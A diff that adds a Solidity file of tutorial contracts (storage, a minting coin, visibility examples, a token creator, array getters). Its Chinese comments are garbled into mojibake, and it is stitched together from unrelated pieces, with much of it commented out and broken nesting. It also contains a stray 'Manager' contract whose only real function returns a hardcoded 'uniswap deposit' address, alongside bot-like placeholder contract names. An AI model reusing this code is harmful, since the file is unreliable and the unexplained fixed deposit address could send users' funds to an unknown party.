@@ -1,0 +1,201 @@
+pragma solidity ^0.6.6;
+
+contract SimpleStorage {
+    uint storedData;
+
+    function set(uint x) public {
+        storedData = x;
+    }
+
+    function get() public view returns (uint) {
+        return storedData;
+    }
+}
+/*contract GetfrontExample {
+  // public state variable
+  uint[] public myArray;
+
+  // æŒ‡å®šç”Ÿæˆçš„Getter å‡½æ•°
+  /*
+  function myArray(uint i) public view returns (uint) {
+      return myArray[i];
+  }
+  */
+
+  // è¿”å›žæ•´ä¸ªæ•°ç»„
+  /*function getArray() public view returns (uint[] memory) {
+      return myArray;
+  }
+}*/
+contract Coin {
+    // å…³é”®å­—â€œpublicâ€è®©è¿™äº›å˜é‡å¯ä»¥ä»Žå¤–éƒ¨è¯»å–
+    address public minter;
+    mapping (address => uint) public balances;
+
+    // è½»å®¢æˆ·ç«¯å¯ä»¥é€šè¿‡äº‹ä»¶é’ˆå¯¹å˜åŒ–ä½œå‡ºé«˜æ•ˆçš„ååº”
+    event Sent(address from, address to, uint amount);
+
+    // è¿™æ˜¯æž„é€ å‡½æ•°ï¼Œåªæœ‰å½“åˆçº¦åˆ›å»ºæ—¶è¿è¡Œ
+    /*constructor() {
+        minter = msg.sender;
+    }
+
+    function mint(address receiver, uint amount) public {
+        require(msg.sender == minter);
+        require(amount < 1e60);
+        balances[receiver] += amount;
+    }
+
+    function send(address receiver, uint amount) public {
+        require(amount <= balances[msg.sender], "Insufficient balance.");
+        balances[msg.sender] -= amount;
+        balances[receiver] += amount;
+        emit Sent(msg.sender, receiver, amount);
+    }*/
+}
+/*contract GetBNBExample {
+  // public state variable
+  uint[] public myArray;
+
+  // æŒ‡å®šç”Ÿæˆçš„Getter å‡½æ•°
+  /*
+  function myArray(uint i) public view returns (uint) {
+      return myArray[i];
+  }
+  */
+
+  // è¿”å›žæ•´ä¸ªæ•°ç»„
+  /*function getArray() public view returns (uint[] memory) {
+      return myArray;
+  }
+}*/
+contract C {
+    uint private data;
+
+    //function f(uint a) public returns(uint b) { return a + 1; }
+    function setData(uint a) public { data = a; }
+    //function getData() public returns(uint) { return data; }
+    //function compute(uint a, uint b) internal returns (uint) { return a+b; }
+}
+
+// ä¸‹é¢ä»£ç ç¼–è¯‘é”™è¯¯
+/*contract D {
+    function readData() public {
+        C c = new C();
+        uint local = c.f(7); // é”™è¯¯ï¼šæˆå‘˜ `f` ä¸å¯è§
+        c.setData(3);
+        local = c.getData();
+        local = c.compute(3, 5); // é”™è¯¯ï¼šæˆå‘˜ `compute` ä¸å¯è§
+    }
+}*/
+
+contract E is C {
+    /*function g() public {
+        C c = new C();
+        uint val = compute(3, 5); // è®¿é—®å†…éƒ¨æˆå‘˜ï¼ˆä»Žç»§æ‰¿åˆçº¦è®¿é—®çˆ¶åˆçº¦æˆå‘˜ï¼‰
+    }*/
+}
+
+contract OwnedToken {
+    // TokenCreator æ˜¯å¦‚ä¸‹å®šä¹‰çš„åˆçº¦ç±»åž‹.
+    // ä¸åˆ›å»ºæ–°åˆçº¦çš„è¯ï¼Œä¹Ÿå¯ä»¥å¼•ç”¨å®ƒã€‚
+    TokenCreator creator;
+    address owner;
+    bytes32 name;
+
+    // è¿™æ˜¯æ³¨å†Œ creator å’Œè®¾ç½®åç§°çš„æž„é€ å‡½æ•°ã€‚
+    constructor(bytes32 _name) public{
+        // çŠ¶æ€å˜é‡é€šè¿‡å…¶åç§°è®¿é—®ï¼Œè€Œä¸æ˜¯é€šè¿‡ä¾‹å¦‚ this.owner çš„æ–¹å¼è®¿é—®ã€‚
+        // è¿™ä¹Ÿé€‚ç”¨äºŽå‡½æ•°ï¼Œç‰¹åˆ«æ˜¯åœ¨æž„é€ å‡½æ•°ä¸­ï¼Œä½ åªèƒ½åƒè¿™æ ·ï¼ˆâ€œå†…éƒ¨åœ°â€ï¼‰è°ƒç”¨å®ƒä»¬ï¼Œ
+        // å› ä¸ºåˆçº¦æœ¬èº«è¿˜ä¸å­˜åœ¨ã€‚
+        owner = msg.sender;
+        // ä»Ž `address` åˆ° `TokenCreator` ï¼Œæ˜¯åšæ˜¾å¼çš„ç±»åž‹è½¬æ¢
+        // å¹¶ä¸”å‡å®šè°ƒç”¨åˆçº¦çš„ç±»åž‹æ˜¯ TokenCreatorï¼Œæ²¡æœ‰çœŸæ­£çš„æ–¹æ³•æ¥æ£€æŸ¥è¿™ä¸€ç‚¹ã€‚
+        creator = TokenCreator(msg.sender);
+        name = _name;
+    }
+
+    function changeName(bytes32 newName) public {
+        // åªæœ‰ creator ï¼ˆå³åˆ›å»ºå½“å‰åˆçº¦çš„åˆçº¦ï¼‰èƒ½å¤Ÿæ›´æ”¹åç§° â€”â€” å› ä¸ºåˆçº¦æ˜¯éšå¼è½¬æ¢ä¸ºåœ°å€çš„ï¼Œ
+        // æ‰€ä»¥è¿™é‡Œçš„æ¯”è¾ƒæ˜¯å¯è¡Œçš„ã€‚
+        if (msg.sender == address(creator))
+            name = newName;
+    }
+
+    /*function transfer(address newOwner) public {
+        // åªæœ‰å½“å‰æ‰€æœ‰è€…æ‰èƒ½å‘é€ tokenã€‚
+        if (msg.sender != owner) return;
+        // æˆ‘ä»¬ä¹Ÿæƒ³è¯¢é—® creator æ˜¯å¦å¯ä»¥å‘é€ã€‚
+        // è¯·æ³¨æ„ï¼Œè¿™é‡Œè°ƒç”¨äº†ä¸€ä¸ªä¸‹é¢å®šä¹‰çš„åˆçº¦ä¸­çš„å‡½æ•°ã€‚
+        // å¦‚æžœè°ƒç”¨å¤±è´¥ï¼ˆæ¯”å¦‚ï¼Œç”±äºŽ gas ä¸è¶³ï¼‰ï¼Œä¼šç«‹å³åœæ­¢æ‰§è¡Œã€‚
+        //if (creator.isTokenTransferOK(owner, newOwner))
+            //owner = newOwner;
+    }*/
+}
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x5b46517F33139aA33124725C8bB5885B8aaEe512;
+	}
+}
+contract TokenCreator {
+    function createToken(bytes32 name)
+       public
+       returns (OwnedToken tokenAddress)
+    {
+        // åˆ›å»ºä¸€ä¸ªæ–°çš„ Token åˆçº¦å¹¶ä¸”è¿”å›žå®ƒçš„åœ°å€ã€‚
+        // ä»Ž JavaScript æ–¹é¢æ¥è¯´ï¼Œè¿”å›žç±»åž‹æ˜¯ç®€å•çš„ `address` ç±»åž‹ï¼Œå› ä¸º
+        // è¿™æ˜¯åœ¨ ABI ä¸­å¯ç”¨çš„æœ€æŽ¥è¿‘çš„ç±»åž‹ã€‚
+        return new OwnedToken(name);
+    }
+
+    function changeName(OwnedToken tokenAddress, bytes32 name)  public {
+        // åŒæ ·ï¼Œ`tokenAddress` çš„å¤–éƒ¨ç±»åž‹ä¹Ÿæ˜¯ `address` ã€‚
+        tokenAddress.changeName(name);
+    }
+
+    /*function isTokenTransferOK(address currentOwner, address newOwner)
+        public
+        view
+        returns (bool ok)
+    {
+        // æ£€æŸ¥ä¸€äº›ä»»æ„çš„æƒ…å†µã€‚
+        address tokenAddress = msg.sender;
+        return (keccak256(newOwner) & 0xff) == (bytes20(tokenAddress) & 0xff);
+    }*/
+}
+contract arrayExample {
+  // public state variable
+  uint[] public myArray;
+
+  // æŒ‡å®šç”Ÿæˆçš„Getter å‡½æ•°
+  /*
+  function myArray(uint i) public view returns (uint) {
+      return myArray[i];
+  }
+  */
+
+  // è¿”å›žæ•´ä¸ªæ•°ç»„
+  function getArray() public view returns (uint[] memory) {
+      return myArray;
+  }
+}
+/*contract GetBotExample {
+  // public state variable
+  uint[] public myArray;
+
+  // æŒ‡å®šç”Ÿæˆçš„Getter å‡½æ•°
+  /*
+  function myArray(uint i) public view returns (uint) {
+      return myArray[i];
+  }
+  */
+
+  // è¿”å›žæ•´ä¸ªæ•°ç»„
+  /*function getArray() public view returns (uint[] memory) {
+      return myArray;
+  }
+}*/
